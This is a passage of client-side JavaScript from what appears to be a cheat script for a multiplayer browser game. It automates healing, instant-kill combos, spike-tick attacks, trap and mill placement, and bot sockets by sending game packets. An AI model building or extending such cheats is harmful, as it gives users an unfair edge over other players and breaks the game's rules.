        player.upgrAge = age;
        if (points > 0) {
            tmpList.length = 0;
            UTILS.removeAllChildren(upgradeHolder);
            for (let i = 0; i < items.weapons.length; ++i) {
                if (items.weapons[i].age == age && (items.weapons[i].pre == undefined || player.weapons.indexOf(items.weapons[i].pre) >= 0)) {
                    let e = UTILS.generateElement({
                        id: "upgradeItem" + i,
                        class: "actionBarItem",
                        onmouseout: function() {
                            showItemInfo();
                        },
                        parent: upgradeHolder
                    });
                    e.style.backgroundImage = getEl("actionBarItem" + i).style.backgroundImage;
                    tmpList.push(i);
                }
            }
            for (let i = 0; i < items.list.length; ++i) {
                if (items.list[i].age == age && (items.list[i].pre == undefined || player.items.indexOf(items.list[i].pre) >= 0)) {
                    let tmpI = (items.weapons.length + i);
                    let e = UTILS.generateElement({
                        id: "upgradeItem" + tmpI,
                        class: "actionBarItem",
                        onmouseout: function() {
                            showItemInfo();
                        },
                        parent: upgradeHolder
                    });
                    e.style.backgroundImage = getEl("actionBarItem" + tmpI).style.backgroundImage;
                    tmpList.push(tmpI);
                }
            }
            for (let i = 0; i < tmpList.length; i++) {
                (function(i) {
                    let tmpItem = getEl('upgradeItem' + i);
                    // tmpItem.onmouseover = function() {
                    //     if (items.weapons[i]) {
                    //         showItemInfo(items.weapons[i], true);
                    //     } else {
                    //         showItemInfo(items.list[i - items.weapons.length]);
                    //     }
                    // };
                    tmpItem.onclick = UTILS.checkTrusted(function() {
                        packet("H", i);
                    });
                    UTILS.hookTouchEvents(tmpItem);
                })(tmpList[i]);
            }
            if (tmpList.length) {
                upgradeHolder.style.display = "block";
                upgradeCounter.style.display = "block";
                upgradeCounter.innerHTML = "SELECT ITEMS (" + points + ")";
            } else {
                upgradeHolder.style.display = "none";
                upgradeCounter.style.display = "none";
                showItemInfo();
            }
        } else {
            upgradeHolder.style.display = "none";
            upgradeCounter.style.display = "none";
            showItemInfo();
        }
    }

    // KILL OBJECT:
    function killObject(sid) {
        let findObj = findObjectBySid(sid);
        objectManager.disableBySid(sid);
        if (player) {
            for (let i = 0; i < breakObjects.length; i++) {
                if (breakObjects[i].sid == sid) {
                    breakObjects.splice(i, 1);
                    break;
                }
            }
            if (!player.canSee(findObj)) {
                breakTrackers.push({
                    x: findObj.x,
                    y: findObj.y
                });
            }
            if (breakTrackers.length > 8) {
                breakTrackers.shift();
            }
            traps.replacer(findObj);
        }
    }

    // KILL ALL OBJECTS BY A PLAYER:
    function killObjects(sid) {
        if (player) objectManager.removeAllItems(sid);
    }
    function setTickout(doo, timeout) {
        if (!ticks.manage[ticks.tick + timeout]) {
            ticks.manage[ticks.tick + timeout] = [doo];
        } else {
            ticks.manage[ticks.tick + timeout].push(doo);
        }
    }

    function caf(e, t) {
        try {
            return Math.atan2((t.y2 || t.y) - (e.y2 || e.y), (t.x2 || t.x) - (e.x2 || e.x));
        } catch (e) {
            return 0;
        }
    }

    let found = false;
    let autoQ = false;

    let autos = {
        insta: {
            todo: false,
            wait: false,
            count: 4,
            shame: 5
        },
        bull: false,
        antibull: 0,
        reloaded: false,
        stopspin: true
    }

    // UPDATE PLAYER DATA:
    function updatePlayers(data) {
        // if(player.shameCount > 0) {
        //     my.reSync = true;
        // } else {
        //     my.reSync = false;
        // }

        // let movementPrediction = {
        //     x: player.x2 + (player.oldPos.x2 - player.x2) * -1,
        //     y: player.y2 + (player.oldPos.y2 - player.y2) * -1,
        // }

        //     let potentialzpiketick = liztobj.filter((e) => e.active && e.dmg)

        //     potentialzpiketick.forEach((obj) => {
        //         if(cdf(obj, player) <= 200) {
        //             packet('a', undefined);
        //         }
        //     })

        // let newPos = {
        //     x: player.x2 + (tracker.lastPos.x - player.x2) * -1,
        //     y: player.y2 + (tracker.lastPos.y - player.y2) * -1,
        // }

        function getAngleDifference(angle1, angle2) {
            // Normalize the angles to be between 0 and 2π
            angle1 = angle1 % (2 * Math.PI);
            angle2 = angle2 % (2 * Math.PI);

            // Calculate the absolute difference between the angles
            let diff = Math.abs(angle1 - angle2);

            // Adjust the difference to be between 0 and π
            if (diff > Math.PI) {
                diff = (2 * Math.PI) - diff;
            }

            return diff;
        }

        //     function smartMove(oneTickMove) {
        //         let dir = player.moveDir;

        //         let found = false
        //         let buildings = liztobj.sort((a, b) => Math.hypot(player.y2 - a.y, player.x2 - a.x) - Math.hypot(player.y2 - b.y, player.x2 - b.x))
        //         let spikes = buildings.filter(obj => obj.dmg && cdf(player, obj) < 250 && !obj.isTeamObject(player) && obj.active)

        //         let newPos = {
        //             x: player.x2 + (player.x2 - player.oldPos.x2) * 1.2 + (Math.cos(dir) * 50),
        //             y: player.y2 + (player.y2 - player.oldPos.y2) * 1.2 + (Math.sin(dir) * 50),
        //         }

        //         for (let i = 0; i < spikes.length; i++) {
        //             if (cdf(spikes[i], newPos) < spikes[i].scale + player.scale + 3) {
        //                 found = Math.atan2(player.y2 - spikes[i].y, player.x2 - spikes[i].x)
        //             }
        //         }





        //         if (found != false && !traps.inTrap) {
        //             packet("f", undefined);
        //         } else {
        //             packet("f", dir);
        //         }
        //         player.oldPos.x2 = player.x2;
        //         player.oldPos.y2 = player.y2;
        //     }
        //     function detectEnemySpikeCollisions(tmpObj) {
        //         let buildings = liztobj.sort((a, b) => Math.hypot(tmpObj.y - a.y, tmpObj.x - a.x) - Math.hypot(tmpObj.y - b.y, tmpObj.x - b.x));
        //         let spikes = buildings.filter(obj => obj.dmg && cdf(player, obj) < 200 && !obj.isTeamObject(player) && obj.active);
        //         //here you calculate last vel / delta, add that to current pos, if touch spike do the heh
        //         let enemy = {
        //             // x: tmpObj.x + (player.oldPos.x2 - tmpObj.x) * -2,
        //             // y: tmpObj.y + (player.oldPos.y2 - tmpObj.y) * -2,
        //             x: player.x2 + (player.oldPos.x2 - player.x2) * -1,
        //             y: player.y2 + (player.oldPos.y2 - player.y2) * -1,
        //         }
        //         let found = false;
        //         for (let i = 0; i < spikes.length; i++) {
        //             if (cdf(enemy, spikes[i]) < player.scale + spikes[i].scale) {
        //                 found = true;
        //             }
        //         }

        //         // player.oldPos.x2 = tmpObj.x2;
        //         // player.oldPos.y2 = tmpObj.y2;
        //     }

        game.tick++;
        enemy = [];
        nears = [];
        near = [];
        game.tickSpeed = performance.now() - game.lastTick;
        game.lastTick = performance.now();
        players.forEach((tmp) => {
            tmp.forcePos = !tmp.visible;
            tmp.visible = false;
            if((tmp.timeHealed - tmp.timeDamaged)>0 && tmp.lastshamecount<tmp.shameCount)
                tmp.pinge = (tmp.timeHealed - tmp.timeDamaged);
        });
        for (let i = 0; i < data.length;) {
            tmpObj = findPlayerBySID(data[i]);
            if (tmpObj) {
                tmpObj.t1 = (tmpObj.t2 === undefined) ? game.lastTick : tmpObj.t2;
                tmpObj.t2 = game.lastTick;
                tmpObj.oldPos.x2 = tmpObj.x2;
                tmpObj.oldPos.y2 = tmpObj.y2;
                tmpObj.x1 = tmpObj.x;
                tmpObj.y1 = tmpObj.y;
                tmpObj.x2 = data[i + 1];
                tmpObj.y2 = data[i + 2];
                tmpObj.x3 = tmpObj.x2 + (tmpObj.x2 - tmpObj.oldPos.x2);
                tmpObj.y3 = tmpObj.y2 + (tmpObj.y2 - tmpObj.oldPos.y2);
                tmpObj.d1 = (tmpObj.d2 === undefined) ? data[i + 3] : tmpObj.d2;
                tmpObj.d2 = data[i + 3];
                tmpObj.dt = 0;
                tmpObj.buildIndex = data[i + 4];
                tmpObj.weaponIndex = data[i + 5];
                tmpObj.weaponVariant = data[i + 6];
                tmpObj.team = data[i + 7];
                tmpObj.isLeader = data[i + 8];
                tmpObj.oldSkinIndex = tmpObj.skinIndex;
                tmpObj.oldTailIndex = tmpObj.tailIndex;
                tmpObj.skinIndex = data[i + 9];
                tmpObj.tailIndex = data[i + 10];
                tmpObj.iconIndex = data[i + 11];
                tmpObj.zIndex = data[i + 12];
                tmpObj.visible = true;
                tmpObj.update(game.tickSpeed);
                tmpObj.dist2 = UTILS.getDist(tmpObj, player, 2, 2);
                tmpObj.aim2 = UTILS.getDirect(tmpObj, player, 2, 2);
                tmpObj.dist3 = UTILS.getDist(tmpObj, player, 3, 3);
                tmpObj.aim3 = UTILS.getDirect(tmpObj, player, 3, 3);
                tmpObj.damageThreat = 0;
                if (tmpObj.skinIndex == 45 && tmpObj.shameTimer <= 0) {
                    tmpObj.addShameTimer();
                }
                if (tmpObj.oldSkinIndex == 45 && tmpObj.skinIndex != 45) {
                    tmpObj.shameTimer = 0;
                    tmpObj.shameCount = 0;
                    if (tmpObj == player) {
                        healer();
                    }
                }

                botSkts.forEach((bot) => {
                    bot.showName = 'YEAHHH'
                })

                for(let i = 0; i < players.length; i++) {
                    for(let aa = 0; aa < botSkts.length; aa++) {
                        if(player.id === aa.id) aa.showName = 'YEAHHHHHH'

                    }
                }

                if (player.shameCount < 4 && near.dist3 <= 300 && near.reloads[near.primaryIndex] <= game.tickRate * (window.pingTime >= 200 ? 2 : 1)) {
                    autoQ = true;
                    healer();
                } else {
                    if (autoQ) {
                        healer();
                    }
                    autoQ = false;
                }


                if (tmpObj == player) {
                    if (liztobj.length) {
                        liztobj.forEach((tmp) => {
                            tmp.onNear = false;
                            if (tmp.active) {
                                if (!tmp.onNear && UTILS.getDist(tmp, tmpObj, 0, 2) <= tmp.scale + items.weapons[tmpObj.weapons[0]].range) {
                                    tmp.onNear = true;
                                }
                                if (tmp.isItem && tmp.owner) {
                                    if (!tmp.pps && tmpObj.sid == tmp.owner.sid && UTILS.getDist(tmp, tmpObj, 0, 2) > (parseInt(getEl("breakRange").value) || 0) && !tmp.breakObj && ![13, 14, 20].includes(tmp.id)) {
                                        tmp.breakObj = true;
                                        breakObjects.push({
                                            x: tmp.x,
                                            y: tmp.y,
                                            sid: tmp.sid
                                        });
                                    }
                                }
                            }
                        });
                        let nearTrap = liztobj.filter(e => e.trap && e.active && UTILS.getDist(e, tmpObj, 0, 2) <= (tmpObj.scale + e.getScale() + 25) && !e.isTeamObject(tmpObj)).sort(function(a, b) {
                            return UTILS.getDist(a, tmpObj, 0, 2) - UTILS.getDist(b, tmpObj, 0, 2);
                        })[0];
                        if (nearTrap) {
                            let spike = gameObjects.filter(obj => obj.dmg && cdf(tmpObj, obj) <= tmpObj.scale + nearTrap.scale/2 && !obj.isTeamObject(tmpObj) && obj.active)[0]
                            traps.dist = UTILS.getDist(nearTrap, tmpObj, 0, 2);
                            traps.aim = UTILS.getDirect(spike ? spike : nearTrap, tmpObj, 0, 2);

                            // traps.dist = UTILS.getDist(nearTrap, tmpObj, 0, 2);
                            // traps.aim = UTILS.getDirect(nearTrap, tmpObj, 0, 2);
                            traps.protect(caf(nearTrap, tmpObj) - Math.PI);
                            traps.inTrap = true;
                            sendChat("");
                            traps.info = nearTrap;
                        } else {
                            traps.inTrap = false;
                            traps.info = {};
                        }
                    } else {
                        traps.inTrap = false;
                    }
                }
                if (tmpObj.weaponIndex < 9) {
                    tmpObj.primaryIndex = tmpObj.weaponIndex;
                    tmpObj.primaryVariant = tmpObj.weaponVariant;
                } else if (tmpObj.weaponIndex > 8) {
                    tmpObj.secondaryIndex = tmpObj.weaponIndex;
                    tmpObj.secondaryVariant = tmpObj.weaponVariant;
                }
            }
            i += 13;
        }
        if (textManager.stack.length) {
            let stacks = [];
            let notstacks = [];
            let num = 0;
            let num2 = 0;
            let pos = {
                x: null,
                y: null
            };
            let pos2 = {
                x: null,
                y: null
            }
            textManager.stack.forEach((text) => {
                if (text.value >= 0) {
                    if (num == 0) pos = {
                        x: text.x,
                        y: text.y
                    };
                    num += Math.abs(text.value);
                } else {
                    if (num2 == 0) pos2 = {
                        x: text.x,
                        y: text.y
                    };
                    num2 += Math.abs(text.value);
                }
            });
            if (num2 > 0) {
                textManager.showText(pos2.x, pos2.y, Math.max(45, Math.min(50, num2)), 0.18, 500, num2, "#FF0000");
            }
            if (num > 0) {
                textManager.showText(pos.x, pos.y, Math.max(45, Math.min(50, num)), 0.18, 500, num, "#fff");
            }
            textManager.stack = [];
        }
        if (runAtNextTick.length) {
            runAtNextTick.forEach((tmp) => {
                checkProjectileHolder(...tmp);
            });
            runAtNextTick = [];
        }
        for (let i = 0; i < data.length;) {
            tmpObj = findPlayerBySID(data[i]);
            if (tmpObj) {
                if (!tmpObj.isTeam(player)) {
                    enemy.push(tmpObj);
                    if (tmpObj.dist2 <= items.weapons[tmpObj.primaryIndex == undefined ? 5 : tmpObj.primaryIndex].range + (player.scale * 2)) {
                        nears.push(tmpObj);
                    }
                }
                tmpObj.manageReload();
                if (tmpObj != player) {
                    tmpObj.addDamageThreat(player);
                }
            }
            i += 13;
        }
        /*projectiles.forEach((proj) => {
                    tmpObj = proj;
                    if (tmpObj.active) {
                        tmpObj.tickUpdate(game.tickSpeed);
                    }
                });*/
        if (player && player.alive) {
            if (enemy.length) {
                near = enemy.sort(function(tmp1, tmp2) {
                    return tmp1.dist2 - tmp2.dist2;
                })[0];
            } else {
                // console.log("no enemy");
            }
            if (game.tickQueue[game.tick]) {
                game.tickQueue[game.tick].forEach((action) => {
                    action();
                });
                game.tickQueue[game.tick] = null;
            }
            if (advHeal.length) {
                advHeal.forEach((updHealth) => {
                    if (window.pingTime < 150) {
                        let sid = updHealth[0];
                        let value = updHealth[1];
                        let totalDamage = 100 - value
                        let damaged = updHealth[2];
                        tmpObj = findPlayerBySID(sid);
                        let bullTicked = false;
                        if (tmpObj == player) {
                            if (tmpObj.skinIndex == 7 && (damaged == 5 || (tmpObj.latestTail == 13 && damaged == 2))) {
                                if (my.reSync) {
                                    my.reSync = false;
                                    tmpObj.setBullTick = true;
                                }
                                bullTicked = true;
                            }
                            if (inGame) {
                                let attackers = getAttacker(damaged);
                                let gearDmgs = [0.25, 0.45].map((val) => val * items.weapons[player.weapons[0]].dmg * soldierMult());
                                let includeSpikeDmgs = enemy.length ? !bullTicked && (gearDmgs.includes(damaged) && near.skinIndex == 11) : false;
                                let healTimeout = 140 - window.pingTime;
                                let dmg = 100 - player.health;
                                let slowHeal = function (timer, tickBase) {
                                    if (!tickBase) {
                                        setTimeout(() => {
                                            healer();
                                        }, timer);
                                    } else {
                                        game.tickBase(() => {
                                            healer()
                                        }, 2)
                                    }
                                }
                                if (getEl("healingBeta").checked) {
                                    if (enemy.length) {
                                        if ([0, 7, 8].includes(near.primaryIndex)) {
                                            if (damaged < 75) {
                                                slowHeal(healTimeout)
                                            } else {
                                                healer()
                                            }
                                        }
                                        if ([1, 2, 6].includes(near.primaryIndex)) {
                                            if (damaged >= 25 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 5) {
                                                healer()
                                            } else {
                                                slowHeal(healTimeout)
                                            }
                                        }
                                        if (near.primaryIndex == 3) {
                                            if (near.secondaryIndex == 15) {
                                                if (near.primaryVariant < 2) {
                                                    if (damaged >= 35 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 5 && game.tick - player.antiTimer > 1) {
                                                        tmpObj.canEmpAnti = true
                                                        tmpObj.antiTimer = game.tick
                                                        healer()
                                                    } else {
                                                        slowHeal(healTimeout)
                                                    }
                                                } else {
                                                    if (damaged > 35 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 5 && game.tick - player.antiTimer > 1) {
                                                        tmpObj.canEmpAnti = true
                                                        tmpObj.antiTimer = game.tick
                                                        healer()
                                                    } else {
                                                        slowHeal(healTimeout)
                                                    }
                                                }
                                            } else {
                                                if (damaged >= 25 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 4) {
                                                    healer()
                                                } else {
                                                    slowHeal(healTimeout)
                                                }
                                            }
                                        }
                                        if (near.primaryIndex == 4) {
                                            if (near.primaryVariant >= 1) {
                                                if (damaged >= 10 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 4) {
                                                    healer()
                                                } else {
                                                    slowHeal(healTimeout)
                                                }
                                            } else {
                                                if (damaged >= 35 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 3) {
                                                    healer()
                                                } else {
                                                    slowHeal(healTimeout)
                                                }
                                            }
                                        }
                                        if ([undefined, 5].includes(near.primaryIndex)) {
                                            if (near.secondaryIndex == 10) {
                                                if (dmg >= (includeSpikeDmgs ? 10 : 20) && tmpObj.damageThreat + dmg >= 80 && tmpObj.shameCount < 6) {
                                                    healer()
                                                } else {
                                                    slowHeal(healTimeout)
                                                }
                                            } else
                                                if (near.primaryVariant >= 2 || near.primaryVariant == undefined) {
                                                    if (dmg >= (includeSpikeDmgs ? 15 : 20) && tmpObj.damageThreat + dmg >= 50 && tmpObj.shameCount < 6) {
                                                        healer()
                                                    } else {
                                                        slowHeal(healTimeout)
                                                    }
                                                } else
                                                    if ([undefined || 15].includes(near.secondaryIndex)) {
                                                        if (damaged > (includeSpikeDmgs ? 8 : 20) && player.damageThreat >= 25 && (game.tick - player.antiTimer) > 1) {
                                                            if (tmpObj.shameCount < 5) {
                                                                healer()
                                                            } else {
                                                                slowHeal(healTimeout)
                                                            }
                                                        } else {
                                                            slowHeal(healTimeout)
                                                        }
                                                    } else
                                                        if ([9, 12, 13].includes(near.secondaryIndex)) {
                                                            if (dmg >= 25 && player.damageThreat + dmg >= 70 && tmpObj.shameCount < 6) {
                                                                healer()
                                                            } else {
                                                                slowHeal(healTimeout)
                                                            }
                                                        } else {
                                                            if (damaged > 25 && player.damageThreat + dmg >= 95) {
                                                                healer()
                                                            } else {
                                                                slowHeal(healTimeout)
                                                            }
                                                        }
                                        }
                                        if (near.primaryIndex == 6) {
                                            if (near.secondaryIndex == 15) {
                                                if (damaged >= 25 && tmpObj.damageThreat + dmg >= 95 && tmpObj.shameCount < 4) {
                                                    healer()
                                                } else {
                                                    slowHeal(healTimeout)
                                                }
                                            } else {
                                                if (damaged >= 70 && tmpObj.shameCount < 4) {
                                                    healer()
                                                } else {
                                                    slowHeal(healTimeout)
                                                }
                                            }
                                        }
                                        if (damaged >= 30 && near.reloads[near.secondaryIndex] == 0 && near.dist2 <= 150 && player.skinIndex == 11 && player.tailIndex == 21) instaC.canCounter = true
                                    } else {
                                        if (damaged >= 70) {
                                            healer()
                                        } else {
                                            slowHeal(healTimeout)
                                        }
                                    }
                                } else {
                                    if (damaged >= (includeSpikeDmgs ? 8 : 25) && dmg + player.damageThreat >= 80 && (game.tick - player.antiTimer) > 1) {
                                        if (tmpObj.reloads[53] == 0 && tmpObj.reloads[tmpObj.weapons[1]] == 0) {
                                            tmpObj.canEmpAnti = true;
                                        } else {
                                            player.soldierAnti = true;
                                        }
                                        tmpObj.antiTimer = game.tick;
                                        let shame = [0, 4, 6, 7, 8].includes(near.primaryIndex) ? 2 : 5;
                                        if (tmpObj.shameCount < shame) {
                                            healer();
                                        } else {
                                            if (near.primaryIndex == 7 || (player.weapons[0] == 7 && (near.skinIndex == 11 || near.tailIndex == 21))) {
                                                slowHeal(healTimeout)
                                            } else {
                                                slowHeal(healTimeout, 1)
                                            }
                                        }
                                    } else {
                                        if (near.primaryIndex == 7 || (player.weapons[0] == 7 && (near.skinIndex == 11 || near.tailIndex == 21))) {
                                            slowHeal(healTimeout)
                                        } else {
                                            slowHeal(healTimeout, 1)
                                        }
                                    }
                                    if (damaged >= 25 && near.dist2 <= 140 && player.skinIndex == 11 && player.tailIndex == 21) instaC.canCounter = true
                                }
                            } else {
                                if (!tmpObj.setPoisonTick && (tmpObj.damaged == 5 || (tmpObj.latestTail == 13 && tmpObj.damaged == 2))) {
                                    tmpObj.setPoisonTick = true;
                                }
                            }
                        }
                    } else {
                        let [sid, value, damaged] = updHealth;
                        let totalDamage = 100 - value;
                        let tmpObj = findPlayerBySID(sid);
                        let bullTicked = false;

                        if (tmpObj == player) {
                            if (tmpObj.skinIndex == 7 && (damaged == 5 || (tmpObj.latestTail == 13 && damaged == 2))) {
                                if (my.reSync) {
                                    my.reSync = false;
                                    tmpObj.setBullTick = true;
                                    bullTicked = true;
                                }
                            }
                            if (inGame) {
                                let attackers = getAttacker(damaged);
                                let gearDmgs = [0.25, 0.45].map((val) => val * items.weapons[player.weapons[0]].dmg * soldierMult());
                                let includeSpikeDmgs = enemy.length ? !bullTicked && (gearDmgs.includes(damaged) && near.skinIndex == 11) : false;
                                let healTimeout = 60;
                                let dmg = 100 - player.health;
                                let shameCountThreshold = [2, 5][[0, 4, 6, 7, 8].includes(near.primaryIndex) ? 0 : 1];

                                let slowHeal = function (timer, tickBase) {
                                    if (!tickBase) setTimeout(() => healer(), timer);
                                    else game.tickBase(() => healer(), 2);
                                };

                                if (getEl("healingBeta").checked) {
                                    let canHealFast = [0, 7, 8].includes(near.primaryIndex) ? damaged < 75 :
                                    [1, 2, 6].includes(near.primaryIndex) ? damaged >= 25 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 5 :
                                    [undefined, 5].includes(near.primaryIndex) ? dmg >= (includeSpikeDmgs ? 15 : 20) && tmpObj.damageThreat + dmg >= 50 && tmpObj.shameCount < 6 :
                                    near.primaryIndex == 3 && near.secondaryIndex == 15 ? damaged >= 35 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 5 && game.tick - player.antiTimer > 1 :
                                    near.primaryIndex == 4 ? near.primaryVariant >= 1 ? damaged >= 10 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 4 :
                                    damaged >= 35 && player.damageThreat + dmg >= 95 && tmpObj.shameCount < 3 :
                                    near.primaryIndex == 6 && near.secondaryIndex == 15 ? damaged >= 25 && tmpObj.damageThreat + dmg >= 95 && tmpObj.shameCount < 4 :
                                    damaged >= 25 && player.damageThreat + dmg >= 95;

                                    canHealFast ? healer() : slowHeal(healTimeout);
                                } else {
                                    let canHealFast = damaged >= (includeSpikeDmgs ? 8 : 25) && dmg + player.damageThreat >= 80 && (game.tick - player.antiTimer) > 1;

                                    if (canHealFast) {
                                        if (tmpObj.reloads[53] == 0 && tmpObj.reloads[tmpObj.weapons[1]] == 0) tmpObj.canEmpAnti = true;
                                        else player.soldierAnti = true;
                                        tmpObj.antiTimer = game.tick;
                                        if (tmpObj.shameCount < shameCountThreshold) healer();
                                        else slowHeal(healTimeout, near.primaryIndex == 7 || (player.weapons[0] == 7 && (near.skinIndex == 11 || near.tailIndex == 21)) ? 0 : 1);
                                    } else {
                                        slowHeal(healTimeout, near.primaryIndex == 7 || (player.weapons[0] == 7 && (near.skinIndex == 11 || near.tailIndex == 21)) ? 0 : 1);
                                    }
                                }
                            } else {
                                if (!tmpObj.setPoisonTick && (tmpObj.damaged == 5 || (tmpObj.latestTail == 13 && tmpObj.damaged == 2))) {
                                    tmpObj.setPoisonTick = true;
                                }
                            }
                        }
                    }
                });
                advHeal = [];
            }
            players.forEach((tmp) => {
                if (!tmp.visible && player != tmp) {
                    tmp.reloads = {
                        0: 0,
                        1: 0,
                        2: 0,
                        3: 0,
                        4: 0,
                        5: 0,
                        6: 0,
                        7: 0,
                        8: 0,
                        9: 0,
                        10: 0,
                        11: 0,
                        12: 0,
                        13: 0,
                        14: 0,
                        15: 0,
                        53: 0,
                    };
                }
                if (tmp.setBullTick) {
                    tmp.bullTimer = 0;
                }
                if (tmp.setPoisonTick) {
                    tmp.poisonTimer = 0;
                }
                tmp.updateTimer();
            });
            if (inGame) {
                if (enemy.length) {
                    if (player.canEmpAnti) {
                        player.canEmpAnti = false;
                        if (near.dist2 <= 300 && !my.safePrimary(near) && !my.safeSecondary(near)) {
                            if (near.reloads[53] == 0) {
                                player.empAnti = true;
                                player.soldierAnti = false;
                                //modLog("EmpAnti");
                            } else {
                                player.empAnti = false;
                                player.soldierAnti = true;
                                //modLog("SoldierAnti");
                            }
                        }
                    }
                    let prehit = liztobj.filter(tmp => tmp.dmg && tmp.active && tmp.isTeamObject(player) && UTILS.getDist(tmp, near, 0, 3) <= (tmp.scale + near.scale)).sort(function(a, b) {
                        return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
                    })[0];
                    if (prehit) {
                        if (near.dist3 <= items.weapons[player.weapons[0]].range + player.scale * 1.8 && configs.predictTick) {
                            instaC.canSpikeTick = true;
                            instaC.syncHit = true;
                            if (configs.revTick && player.weapons[1] == 15 && player.reloads[53] == 0 && instaC.perfCheck(player, near)) {
                                instaC.revTick = true;
                            }
                        }
                    }
                    let antiSpikeTick = gameObjects.filter(tmp => tmp.dmg && tmp.active && !tmp.isTeamObject(player) && UTILS.getDist(tmp, player, 0, 3) < (tmp.scale + player.scale)).sort(function(a, b) {
                        return UTILS.getDist(a, player, 0, 2) - UTILS.getDist(b, player, 0, 2);
                    })[0];
                    if (antiSpikeTick && !traps.inTrap) {
                        if (near.dist2 <= items.weapons[5].range + near.scale * 1.8) {
                            my.anti0Tick = 1;
                            sendChat("");
                            player.chat.count = 2000;
                        }
                    }
                }
                if ((useWasd ? true : ((player.checkCanInsta(true) >= 220 ? player.checkCanInsta(true) : player.checkCanInsta(false)) >= (player.weapons[1] == 10 ? 95 : 100))) && near.dist2 <= items.weapons[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]].range + near.scale * 1.8 && (instaC.wait || (useWasd && Math.floor(Math.random() * 5) == 0)) && !instaC.isTrue && !my.waitHit && player.reloads[player.weapons[0]] == 0 && player.reloads[player.weapons[1]] == 0 && (useWasd ? true : (player.reloads[53] <= (player.weapons[1] == 10 ? 0 : game.tickRate))) && instaC.perfCheck(player, near)) {
                    if (player.checkCanInsta(true) >= 220) {
                        instaC.nobull = useWasd ? false : instaC.canSpikeTick ? false : true;
                    } else {
                        instaC.nobull = false;
                    }
                    instaC.can = true;
                } else {
                    instaC.can = false;
                }
                macro.q && place(0, getAttackDir());
                macro.f && place(4, getSafeDir());
                macro.v && place(2, getSafeDir());
                macro.y && place(5, getSafeDir());
                macro.h && place(player.getItemType(22), getSafeDir());
                macro.n && place(3, getSafeDir());
                if (game.tick % 1 == 0) {
                    if (mills.place) {
                        let plcAng = 7.7;
                        for (let i = -plcAng; i <= plcAng; i += plcAng) {
                            checkPlace(3, UTILS.getDirect(player.oldPos, player, 2, 2) + i);
                        }
                    } else {
                        if (mills.placeSpawnPads) {
                            for (let i = 0; i < Math.PI * 2; i += Math.PI / 2) {
                                checkPlace(player.getItemType(20), UTILS.getDirect(player.oldPos, player, 2, 2) + i);
                            }
                        }
                    }
                }
                if (instaC.can) {
                    instaC.changeType(configs.alwaysRev ? "rev" : "normal");
                }
                if (instaC.canCounter) {
                    instaC.canCounter = false;
                    if (player.reloads[player.weapons[0]] == 0 && !instaC.isTrue) {
                        instaC.counterType();
                    }
                }
                if (instaC.canSpikeTick) {
                    instaC.canSpikeTick = false;
                    if (instaC.revTick) {
                        instaC.revTick = false;
                        if ([1, 2, 3, 4, 5, 6].includes(player.weapons[0]) && player.reloads[player.weapons[1]] == 0 && !instaC.isTrue) {
                            instaC.changeType("rev");
                            chch(null, "[RevSyncHit]", "yellow");
                        }
                    } else {
                        if ([1, 2, 3, 4, 5, 6].includes(player.weapons[0]) && player.reloads[player.weapons[0]] == 0 && !instaC.isTrue) {
                            instaC.spikeTickType();
                            if (instaC.syncHit) {
                                chch(null, "[SyncHit]", "yellow");
                            }
                        }
                    }
                }
                if (!clicks.middle && (clicks.left || clicks.right) && !instaC.isTrue) {
                    if ((player.weaponIndex != (clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0])) || player.buildIndex > -1) {
                        selectWeapon(clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]);
                    }
                    if (player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 && !my.waitHit) {
                        sendAutoGather();
                        my.waitHit = 1;
                        game.tickBase(() => {
                            sendAutoGather();
                            my.waitHit = 0;
                        }, 1);
                    }
                }
                if (useWasd && !clicks.left && !clicks.right && !instaC.isTrue && near.dist2 <= (items.weapons[player.weapons[0]].range + near.scale * 1.8) && !traps.inTrap) {
                    if ((player.weaponIndex != player.weapons[0]) || player.buildIndex > -1) {
                        selectWeapon(player.weapons[0]);
                    }
                    if (player.reloads[player.weapons[0]] == 0 && !my.waitHit) {
                        sendAutoGather();
                        my.waitHit = 1;
                        game.tickBase(() => {
                            sendAutoGather();
                            my.waitHit = 0;
                        }, 1);
                    }
                }
                if (traps.inTrap) {
                    if (!clicks.left && !clicks.right && !instaC.isTrue) {
                        if (player.weaponIndex != (traps.notFast() ? player.weapons[1] : player.weapons[0]) || player.buildIndex > -1) {
                            selectWeapon(traps.notFast() ? player.weapons[1] : player.weapons[0]);
                        }
                        if (player.reloads[traps.notFast() ? player.weapons[1] : player.weapons[0]] == 0 && !my.waitHit) {
                            sendAutoGather();
                            my.waitHit = 1;
                            game.tickBase(() => {
                                sendAutoGather();
                                my.waitHit = 0;
                            }, 1);
                        }
                    }
                }
                if (clicked.g && !traps.inTrap) {
                    if (!instaC.isTrue && player.reloads[player.weapons[1]] == 0) {
                        if (my.ageInsta && player.weapons[0] != 4 && player.weapons[1] == 9 && player.age >= 9 && enemy.length) {
                            instaC.bowMovement();
                        } else {
                            instaC.rangeType();
                        }
                    }
                }
                if (macro.t && !traps.inTrap) {
                    if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0 && (player.weapons[1] == 15 ? (player.reloads[player.weapons[1]] == 0) : true) && (player.weapons[0] == 5 || (player.weapons[0] == 4 && player.weapons[1] == 15))) {
                        instaC[(player.weapons[0] == 4 && player.weapons[1] == 15) ? "kmTickMovement" : "tickMovement"]();
                    }
                }
                if (macro["."] && !traps.inTrap) {
                    if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0 && ([9, 12, 13, 15].includes(player.weapons[1]) ? (player.reloads[player.weapons[1]] == 0) : true)) {
                        instaC.boostTickMovement();
                    }
                }
